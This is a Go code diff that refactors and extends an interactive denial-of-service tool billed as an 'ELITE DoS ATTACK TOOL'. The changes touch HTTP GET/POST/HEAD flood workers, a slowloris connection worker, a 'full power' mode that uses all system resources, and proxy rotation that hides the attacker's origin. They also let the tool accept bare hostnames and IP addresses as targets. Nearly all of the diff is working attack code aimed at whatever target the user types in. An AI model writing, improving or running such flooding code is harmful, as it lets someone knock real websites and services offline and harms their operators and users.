@@ -192,6 +192,45 @@ func init() {
 	}
 }
 
+// normalizeDosTarget accepts a full URL or a bare host/IP (optional :port, IPv6 as ::1 or [::1]:8080).
+func normalizeDosTarget(raw string) string {
+	s := strings.TrimSpace(raw)
+	if s == "" {
+		return ""
+	}
+	low := strings.ToLower(s)
+	if strings.HasPrefix(low, "http://") || strings.HasPrefix(low, "https://") {
+		return s
+	}
+	if ip := net.ParseIP(s); ip != nil && ip.To4() == nil {
+		s = "[" + s + "]"
+	}
+	return "http://" + s
+}
+
+// hostBypassesHTTPProxy is true for localhost and RFC1918/link-local hosts — HTTP proxies would connect to the proxy machine, not yours.
+func hostBypassesHTTPProxy(target string) bool {
+	u, err := url.Parse(target)
+	if err != nil || u.Hostname() == "" {
+		return false
+	}
+	h := u.Hostname()
+	if strings.EqualFold(h, "localhost") {
+		return true
+	}
+	if ip := net.ParseIP(h); ip != nil {
+		return ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast()
+	}
+	return false
+}
+
+func applyLocalProxyPolicy(target string, useProxies *bool) {
+	if *useProxies && hostBypassesHTTPProxy(target) {
+		fmt.Printf("%s[i] Proxy rotation disabled: loopback/private targets cannot be reached through external proxies.%s\n", Yellow, Reset)
+		*useProxies = false
+	}
+}
+
 func DoSMenu() {
 	reader := bufio.NewReader(os.Stdin)
 
@@ -254,17 +293,13 @@ func DoSAttack() {
 	fmt.Printf("%s          ELITE DoS ATTACK TOOL%s\n", Red, Reset)
 	fmt.Printf("%s════════════════════════════════════════════════════%s\n\n", Red, Reset)
 
-	fmt.Printf("%sTarget URL (include http:// or https://): %s", Green, Reset)
+	fmt.Printf("%sTarget (URL, hostname, or IP[:port], e.g. 127.0.0.1:8080): %s", Green, Reset)
 	target, _ := reader.ReadString('\n')
-	target = strings.TrimSpace(target)
+	target = normalizeDosTarget(target)
 
 	if target == "" {
 		fmt.Printf("%s[!] No target specified%s\n", Red, Reset)
 		return
-	}
-
-	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
-		target = "http://" + target
 	}
 
 	fmt.Printf("\n%sAttack Methods:%s\n", Yellow, Reset)
@@ -306,6 +341,7 @@ func DoSAttack() {
 	fmt.Printf("%sUse proxy rotation? (y/n): %s", Yellow, Reset)
 	proxyInput, _ := reader.ReadString('\n')
 	useProxies := strings.ToLower(strings.TrimSpace(proxyInput)) == "y"
+	applyLocalProxyPolicy(target, &useProxies)
 
 	fmt.Printf("\n%s[*] Analyzing system resources...%s\n", Yellow, Reset)
 	time.Sleep(1 * time.Second)
@@ -504,51 +540,55 @@ func launchAttack(config AttackConfig, monitor *ResourceMonitor) {
 	reader.ReadString('\n')
 }
 
+func httpFloodOnce(config AttackConfig, client *http.Client, method string) {
+	req, err := createHTTPRequest(config, method)
+	if err != nil {
+		atomic.AddUint64(&failedHits, 1)
+		return
+	}
+
+	resp, err := client.Do(req)
+	if err != nil {
+		atomic.AddUint64(&failedHits, 1)
+		atomic.AddUint64(&totalRequests, 1)
+		return
+	}
+
+	resp.Body.Close()
+
+	if resp.StatusCode >= 200 && resp.StatusCode < 400 {
+		atomic.AddUint64(&successfulHits, 1)
+	} else {
+		atomic.AddUint64(&failedHits, 1)
+	}
+
+	bytesSize := uint64(800)
+	if method == "POST" {
+		bytesSize = 1824
+	}
+	atomic.AddUint64(&totalBytes, bytesSize)
+	atomic.AddUint64(&totalRequests, 1)
+}
+
 func httpFloodWorker(config AttackConfig, method string) {
 	client := createHTTPClient(config)
-
 	for attackRunning {
-		req, err := createHTTPRequest(config, method)
-		if err != nil {
-			atomic.AddUint64(&failedHits, 1)
-			continue
-		}
-
-		resp, err := client.Do(req)
-		if err != nil {
-			atomic.AddUint64(&failedHits, 1)
-			atomic.AddUint64(&totalRequests, 1)
-			continue
-		}
-
-		resp.Body.Close()
-
-		if resp.StatusCode >= 200 && resp.StatusCode < 400 {
-			atomic.AddUint64(&successfulHits, 1)
-		} else {
-			atomic.AddUint64(&failedHits, 1)
-		}
-
-		bytesSize := uint64(800)
-		if method == "POST" {
-			bytesSize = 1824
-		}
-		atomic.AddUint64(&totalBytes, bytesSize)
-		atomic.AddUint64(&totalRequests, 1)
+		httpFloodOnce(config, client, method)
 	}
 }
 
 func mixedFloodWorker(config AttackConfig) {
 	methods := []string{"GET", "POST", "HEAD"}
-
+	client := createHTTPClient(config)
 	for attackRunning {
 		method := methods[rand.Intn(len(methods))]
-		httpFloodWorker(config, method)
+		httpFloodOnce(config, client, method)
 	}
 }
 
 func fullMethodWorker(config AttackConfig) {
 	methods := []string{"GET", "POST", "HEAD"}
+	client := createHTTPClient(config)
 	ticker := time.NewTicker(5 * time.Second)
 	defer ticker.Stop()
 
@@ -557,10 +597,9 @@ func fullMethodWorker(config AttackConfig) {
 	for attackRunning {
 		select {
 		case <-ticker.C:
-			methodIndex = (methodIndex + 1) % 3
+			methodIndex = (methodIndex + 1) % len(methods)
 		default:
-			method := methods[methodIndex]
-			httpFloodWorker(config, method)
+			httpFloodOnce(config, client, methods[methodIndex])
 		}
 	}
 }
@@ -584,8 +623,15 @@ func slowlorisWorker(config AttackConfig) {
 			continue
 		}
 
+		reqPath := targetURL.Path
+		if reqPath == "" {
+			reqPath = "/"
+		}
+		if q := targetURL.RawQuery; q != "" {
+			reqPath += "?" + q
+		}
 		headers := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n",
-			targetURL.Path, targetURL.Host, randomUserAgent())
+			reqPath, targetURL.Host, randomUserAgent())
 
 		conn.Write([]byte(headers))
 		atomic.AddUint64(&successfulHits, 1)
@@ -671,7 +717,8 @@ func createHTTPClient(config AttackConfig) *http.Client {
 		DisableKeepAlives:   false,
 	}
 
-	if config.UseProxies && len(proxyList) > 0 {
+	useProxy := config.UseProxies && len(proxyList) > 0 && !hostBypassesHTTPProxy(config.Target)
+	if useProxy {
 		proxyURL, _ := url.Parse(proxyList[rand.Intn(len(proxyList))])
 		transport.Proxy = http.ProxyURL(proxyURL)
 	}
@@ -808,7 +855,11 @@ func displayFinalStats(startTime time.Time) {
 	fmt.Printf("%s  Requests Per Second:  %.2f%s\n", Blue, float64(requests)/elapsed.Seconds(), Reset)
 	fmt.Printf("%s  Successful Hits:      %s%d%s\n", Blue, Green, successful, Reset)
 	fmt.Printf("%s  Failed Hits:          %s%d%s\n", Blue, Red, failed, Reset)
-	fmt.Printf("%s  Success Rate:         %.2f%%%s\n", Blue, float64(successful)/float64(requests)*100, Reset)
+	successRate := 0.0
+	if requests > 0 {
+		successRate = float64(successful) / float64(requests) * 100
+	}
+	fmt.Printf("%s  Success Rate:         %.2f%%%s\n", Blue, successRate, Reset)
 	fmt.Printf("%s  Total Data Sent:      %.2f GB%s\n", Blue, float64(bytes)/(1024*1024*1024), Reset)
 	fmt.Printf("%s  Total Throughput:     %s%.4f TBPS%s\n\n", Blue, Green, tbps, Reset)
 }
@@ -867,17 +918,17 @@ func MultiMethodAttack() {
 	fmt.Printf("%s       MULTI-METHOD DDoS ATTACK%s\n", Yellow, Reset)
 	fmt.Printf("%s════════════════════════════════════════════════════%s\n\n", Yellow, Reset)
 
-	fmt.Printf("%sTarget URL: %s", Green, Reset)
+	fmt.Printf("%sTarget (URL, hostname, or IP[:port]): %s", Green, Reset)
 	target, _ := reader.ReadString('\n')
-	target = strings.TrimSpace(target)
+	target = normalizeDosTarget(target)
 
 	if target == "" {
 		fmt.Printf("%s[!] No target specified%s\n", Red, Reset)
 		return
 	}
 
-	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
-		target = "http://" + target
+	if hostBypassesHTTPProxy(target) {
+		fmt.Printf("%s[i] Multi-method sends HTTP only — a server must be listening on that host:port or stats will show failures.%s\n", Blue, Reset)
 	}
 
 	fmt.Printf("%sDuration in seconds (0 for unlimited): %s", Green, Reset)
@@ -891,6 +942,7 @@ func MultiMethodAttack() {
 	fmt.Printf("%sUse proxy rotation? (y/n): %s", Yellow, Reset)
 	proxyInput, _ := reader.ReadString('\n')
 	useProxies := strings.ToLower(strings.TrimSpace(proxyInput)) == "y"
+	applyLocalProxyPolicy(target, &useProxies)
 
 	fmt.Printf("\n%s[*] Analyzing system resources...%s\n", Yellow, Reset)
 	time.Sleep(1 * time.Second)
@@ -934,24 +986,25 @@ func FullPowerAttack() {
 	fmt.Printf("%s╚════════════════════════════════════════════════════╝%s\n\n", Red, Reset)
 
 	fmt.Printf("%s[⚠️ ] This will use ALL available system resources!%s\n", Red, Reset)
-	fmt.Printf("%s[⚠️ ] Are you sure? (yes/no): %s", Red, Reset)
+	fmt.Printf("%s[⚠️ ] Are you sure? (yes/y or no): %s", Red, Reset)
 	confirmation, _ := reader.ReadString('\n')
-	if strings.ToLower(strings.TrimSpace(confirmation)) != "yes" {
+	c := strings.ToLower(strings.TrimSpace(confirmation))
+	if c != "yes" && c != "y" {
 		fmt.Printf("%s[*] Attack cancelled%s\n", Yellow, Reset)
+		fmt.Printf("\n%sPress Enter to continue...%s", Green, Reset)
+		reader.ReadString('\n')
 		return
 	}
 
-	fmt.Printf("\n%sTarget URL: %s", Green, Reset)
+	fmt.Printf("\n%sTarget (URL, hostname, or IP[:port]): %s", Green, Reset)
 	target, _ := reader.ReadString('\n')
-	target = strings.TrimSpace(target)
+	target = normalizeDosTarget(target)
 
 	if target == "" {
 		fmt.Printf("%s[!] No target specified%s\n", Red, Reset)
+		fmt.Printf("\n%sPress Enter to continue...%s", Green, Reset)
+		reader.ReadString('\n')
 		return
-	}
-
-	if !strings.HasPrefix(target, "http://") && !strings.HasPrefix(target, "https://") {
-		target = "http://" + target
 	}
 
 	fmt.Printf("%sDuration in seconds (0 for unlimited): %s", Green, Reset)
@@ -961,6 +1014,9 @@ func FullPowerAttack() {
 	if duration < 0 {
 		duration = 0
 	}
+
+	useProxies := true
+	applyLocalProxyPolicy(target, &useProxies)
 
 	fmt.Printf("\n%s[*] Analyzing system resources...%s\n", Yellow, Reset)
 	time.Sleep(1 * time.Second)
@@ -977,7 +1033,7 @@ func FullPowerAttack() {
 		Method:         "FULL",
 		Duration:       duration,
 		WorkersPerCore: WORKER_MULTIPLIER * 2,
-		UseProxies:     true,
+		UseProxies:     useProxies,
 		RandomHeaders:  true,
 		FollowRedirect: false,
 		InstanceID:     0,
